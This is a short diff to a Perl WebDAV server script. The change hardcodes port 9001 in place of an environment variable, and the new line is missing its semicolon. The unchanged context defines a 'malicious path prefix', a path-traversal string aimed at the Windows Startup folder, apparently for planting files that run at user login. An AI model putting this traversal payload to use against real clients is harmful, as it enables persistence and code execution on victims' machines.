@@ -7,7 +7,8 @@ use warnings;
 use IO::Socket::INET;
 
 my $MALICIOUS_PATH_PREFIX = $ENV{MALICIOUS_PATH_PREFIX} || "..\\..\\..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
-my $port = $ENV{PORT}; # heroku gonna dispatch the port to listen on as an environment variable
+#my $port = $ENV{PORT}; # heroku gonna dispatch the port to listen on as an environment variable
+my $port = 9001
 die "Usage: set the PORT environment variable to control where the webdav server should be listening" if(!$port);
 
 $| = 1;
